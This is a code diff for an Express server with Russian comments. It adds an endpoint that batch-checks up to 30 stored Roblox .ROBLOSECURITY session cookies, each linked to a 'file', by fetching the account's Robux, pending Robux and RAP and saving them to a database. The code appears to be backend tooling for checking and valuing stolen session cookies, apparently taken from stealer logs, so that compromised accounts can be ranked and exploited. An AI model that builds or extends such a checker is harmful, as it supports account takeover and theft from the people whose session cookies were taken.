@@ -827,6 +827,46 @@ app.post('/robux-check', requireAuth, async (req, res) => {
   res.json(info);
 });
 
+// POST /api/tokens-check-batch — быстрая проверка порции токенов (без лимитов и таймаутов)
+app.post('/api/tokens-check-batch', requireAuth, async (req, res) => {
+  const user = req.authUser || req.session.user;
+  const db = await getDb();
+  const { tokens } = req.body;
+  if (!Array.isArray(tokens) || tokens.length === 0) {
+    return res.json({ results: [] });
+  }
+
+  const results = await Promise.all(tokens.slice(0, 30).map(async (item) => {
+    const filename = item.file;
+    const security = cleanRobloSecurity(item.security);
+    if (!security) return { file: filename, valid: false, error: 'No token' };
+
+    try {
+      const info = await fetchRobuxInfo(security);
+      if (db && info.valid && info.userId) {
+        await db.collection('files').updateOne(
+          { name: filename },
+          { $set: {
+            'robuxInfo.userId': info.userId,
+            'robuxInfo.robux': info.robux,
+            'robuxInfo.pendingRobux': info.pendingRobux || 0,
+            'robuxInfo.rap': info.rap || 0,
+            'robuxInfo.valid': true,
+            'robuxInfo.checked': new Date().toISOString(),
+            'roblox.userId': info.userId,
+            ...(info.username ? { 'roblox.user': info.username } : {})
+          }}
+        );
+      }
+      return { file: filename, ...info };
+    } catch (e) {
+      return { file: filename, valid: false, error: e.message };
+    }
+  }));
+
+  res.json({ results });
+});
+
 // POST /robux-bulk — быстрая параллельная проверка всех сохранённых токенов (бачинг по 10)
 app.post('/robux-bulk', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
